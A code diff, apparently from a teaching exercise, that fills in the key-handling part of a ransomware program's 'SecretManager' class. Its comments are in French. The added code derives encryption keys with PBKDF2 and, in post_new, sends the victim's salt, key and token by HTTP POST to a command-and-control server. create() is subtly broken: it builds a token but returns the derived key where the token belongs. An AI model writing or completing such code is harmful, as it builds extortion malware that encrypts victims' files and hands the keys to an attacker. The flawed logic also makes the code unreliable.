@@ -12,6 +12,8 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 from xorcrypt import xorfile
 
+
+
 class SecretManager:
     ITERATION = 48000
     TOKEN_LENGTH = 16
@@ -24,24 +26,50 @@ class SecretManager:
         self._key = None
         self._salt = None
         self._token = None
-
         self._log = logging.getLogger(self.__class__.__name__)
 
-    def do_derivation(self, salt:bytes, key:bytes)->bytes:
-        raise NotImplemented()
+    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
+        # Initialiser le KDF (Key Derivation Function) avec PBKDF2HMAC
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            length=self.KEY_LENGTH,
+            salt=salt,
+            iterations=self.ITERATION,
+            
+        )
+        # Dérive la clé en utilisant le sel et la clé initiale
+        derived_key = kdf.derive(key)
+        return derived_key
 
-
-    def create(self)->Tuple[bytes, bytes, bytes]:
-        raise NotImplemented()
-
+    def create(self) -> Tuple[bytes, bytes, bytes]:
+         # Générer un sel et une clé aléatoires en utilisant token_bytes
+        salt = secrets.token_bytes(self.SALT_LENGTH)
+        key = secrets.token_bytes(self.KEY_LENGTH)
+        # Générer un token aléatoire
+        token = secrets.token_bytes(self.TOKEN_LENGTH)
+        # Dérive la clé en utilisant do_derivation
+        derived_key = self.do_derivation(salt, key)
+        return salt, key, derived_key
 
     def bin_to_b64(self, data:bytes)->str:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
 
-    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
-        # register the victim to the CNC
-        raise NotImplemented()
+    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
+        # Préparer les données à envoyer au CNC
+        data = {
+            "token": self.bin_to_b64(token),
+            "salt": self.bin_to_b64(salt),
+            "key": self.bin_to_b64(key)
+        }
+
+        # Envoyer les données au CNC en utilisant une requête POST
+        response = requests.post(f'http://{self._remote_host_port}/new', json=data)
+
+        # Vérifier si la réponse du CNC est un succès
+        if response.status_code != 200 or response.json().get("status") != "OK":
+            self._log.error("Failed to register the victim to the CNC")
+            raise Exception("Failed to register the victim to the CNC")
 
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
@@ -74,3 +102,6 @@ class SecretManager:
     def clean(self):
         # remove crypto data from the target
         raise NotImplemented()
+    
+
+    
